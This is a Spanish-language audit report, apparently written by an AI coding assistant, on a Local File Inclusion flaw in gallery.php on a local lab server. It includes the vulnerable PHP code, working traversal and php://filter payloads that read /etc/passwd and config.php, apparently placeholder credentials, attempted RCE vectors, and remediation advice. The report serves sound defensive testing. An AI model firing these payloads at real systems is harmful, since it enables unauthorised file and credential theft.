# Informe de Auditoría de Seguridad — Local File Inclusion (LFI)

**Fecha:** 2026-04-21T08:05:07  
**Objetivo:** http://web.dev.local:8081  
**Analista:** GitHub Copilot (Claude Sonnet 4.6)  
**Tipo de análisis:** Local File Inclusion (LFI)

---

## Resumen Ejecutivo

Se ha identificado y explotado con éxito una vulnerabilidad crítica de **Local File Inclusion (LFI)** en el parámetro `page` del endpoint `gallery.php`. La vulnerabilidad permite a un atacante leer archivos arbitrarios del sistema de ficheros del servidor, incluyendo ficheros de configuración con credenciales y ficheros sensibles del sistema operativo.

**Severidad:** 🔴 CRÍTICA (CVSS 9.1)

---

## Reconocimiento

### Tecnologías identificadas
- **Servidor web:** Apache / PHP
- **Ruta web:** `/var/www/html/`
- **Sistema operativo:** Linux 6.8.0-41-generic (Ubuntu)
- **Lenguaje:** PHP

### Endpoint vulnerable
```
GET http://web.dev.local:8081/gallery.php?page=<VALOR>
```

El parámetro `page` se utiliza para cargar páginas dinámicas en la galería. Los valores legítimos son: `modern`, `classic`, `abstract`, `about`.

---

## Análisis del Código Fuente Vulnerable

Mediante la técnica PHP wrapper `php://filter`, se obtuvo el código fuente de `gallery.php`:

```php
$page = $_GET['page'] ?? 'modern';

// Check if the page parameter contains file extension
if (strpos($page, '.') !== false) {
    // If it has an extension, use it as-is 
    $file = $page;
} else {
    // Otherwise, assume it's a page in the pages directory
    $file = "pages/" . $page . ".php";
}

if (file_exists($file)) {
    include($file);
} else {
    // Try to include anyway
    @include($file);
}
```

**Causa raíz:** La aplicación detecta si el parámetro contiene un punto (`.`) para decidir la ruta del fichero. Si contiene un punto, usa el valor directamente en un `include()` sin ninguna validación ni sanitización. Esto permite el uso de path traversal (`../../../../`) para acceder a cualquier fichero del sistema.

---

## Pruebas de Explotación

### 1. LFI Básico — Lectura de `/etc/passwd`

**Payload:**
```
GET /gallery.php?page=../../../../etc/passwd
```

**Resultado:** ✅ EXITOSO

```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin
```

### 2. PHP Wrapper — Lectura de código fuente con base64

**Payload:**
```
GET /gallery.php?page=php://filter/convert.base64-encode/resource=gallery.php
```

**Resultado:** ✅ EXITOSO — Se obtuvo el código fuente completo de `gallery.php` en base64 y se decodificó, revelando la lógica de inclusión vulnerable.

### 3. PHP Wrapper — Lectura de fichero de configuración secreto

**Payload:**
```
GET /gallery.php?page=php://filter/convert.base64-encode/resource=config.php
```

**Resultado:** ✅ EXITOSO — Se obtuvo el contenido completo de `config.php`:

```php
<?php
// Secret configuration file
// Database credentials (example)

define('DB_HOST', 'localhost');
define('DB_USER', 'gallery_user');
define('DB_PASS', 'SuperSecret123!');
define('DB_NAME', 'gallery_db');

define('SECRET_KEY', 'th1s_is_a_v3ry_s3cr3t_k3y_2025');
define('API_TOKEN', 'api_token_abc123xyz789');

// This file can be exposed through LFI vulnerability
// Example: gallery.php?page=../config
?>
```

> **⚠️ CREDENCIALES EXPUESTAS:**
> - DB Password: `SuperSecret123!`
> - Secret Key: `th1s_is_a_v3ry_s3cr3t_k3y_2025`
> - API Token: `api_token_abc123xyz789`

### 4. Lectura de `/etc/hosts`

**Payload:**
```
GET /gallery.php?page=../../../../etc/hosts
```

**Resultado:** ✅ EXITOSO

```
127.0.0.1   localhost
::1         localhost ip6-localhost ip6-loopback
172.19.0.2  d5054e367753
```

### 5. Lectura de `/proc/version`

**Payload:**
```
GET /gallery.php?page=../../../../proc/version
```

**Resultado:** ✅ EXITOSO

```
Linux version 6.8.0-41-generic (buildd@lcy02-amd64-100) (x86_64-linux-gnu-gcc-13 (Ubuntu 13.2.0-23ubuntu4) 13.2.0, GNU ld (GNU Binutils for Ubuntu) 2.42) #41-Ubuntu SMP PREEMPT_DYNAMIC Fri Aug  2 20:41:06 UTC 2024
```

---

## Vectores Testados

| Payload | Resultado |
|---------|-----------|
| `../../../../etc/passwd` | ✅ Exitoso |
| `../../../../etc/hosts` | ✅ Exitoso |
| `../../../../proc/version` | ✅ Exitoso |
| `php://filter/convert.base64-encode/resource=gallery.php` | ✅ Exitoso |
| `php://filter/convert.base64-encode/resource=config.php` | ✅ Exitoso |
| `../../../../etc/shadow` | ❌ Sin permisos |
| `../../../../proc/self/environ` | ❌ Bloqueado |
| `expect://id` (RCE) | ❌ Wrapper no disponible |

---

## Impacto

| Categoría | Descripción |
|-----------|-------------|
| **Confidencialidad** | ALTA — Lectura de ficheros del sistema, código fuente PHP y credenciales |
| **Integridad** | MEDIA — No se detectó escritura directa, pero las credenciales expuestas permiten acceso a la BD |
| **Disponibilidad** | BAJA — No se identificó impacto directo en disponibilidad |

**Consecuencias prácticas:**
1. Acceso completo a ficheros de configuración con credenciales de base de datos
2. Enumeración de usuarios del sistema (`/etc/passwd`)
3. Exposición de código fuente PHP mediante `php://filter`
4. Reconocimiento de la infraestructura interna (`/etc/hosts`, `/proc/version`)

---

## Recomendaciones

### 1. Validación estricta del parámetro `page`
```php
// Usar una lista blanca de páginas permitidas
$allowed_pages = ['modern', 'classic', 'abstract', 'about'];
$page = $_GET['page'] ?? 'modern';

if (!in_array($page, $allowed_pages)) {
    $page = 'modern'; // valor por defecto
}

include("pages/" . $page . ".php");
```

### 2. Deshabilitar wrappers PHP peligrosos
En `php.ini`:
```ini
allow_url_include = Off
allow_url_fopen = Off
```

### 3. Nunca concatenar directamente input del usuario en `include()`
Evitar cualquier patrón del tipo:
```php
include($userInput);
include("path/" . $userInput);
```

### 4. Separar ficheros de configuración fuera del DocumentRoot
Los ficheros con credenciales deben estar fuera de `/var/www/html/` para que no sean accesibles a través de LFI.

### 5. Configurar `open_basedir`
```ini
open_basedir = /var/www/html:/tmp
```
Esto restringe las operaciones de fichero de PHP al directorio especificado.

---

## Conclusiones

La aplicación **Galería de Arte Virtual** en `http://web.dev.local:8081` presenta una vulnerabilidad crítica de LFI en el parámetro `page` de `gallery.php`. La explotación fue posible sin autenticación y permitió:

- Lectura de ficheros del sistema operativo (`/etc/passwd`, `/etc/hosts`, `/proc/version`)
- Obtención del código fuente PHP de la aplicación
- Exfiltración de credenciales de base de datos y claves secretas desde `config.php`

Esta vulnerabilidad debe ser remediada **inmediatamente** siguiendo las recomendaciones indicadas.

---

*Informe generado el 2026-04-21T08:05:07 UTC | GitHub Copilot CLI (Claude Sonnet 4.6)*
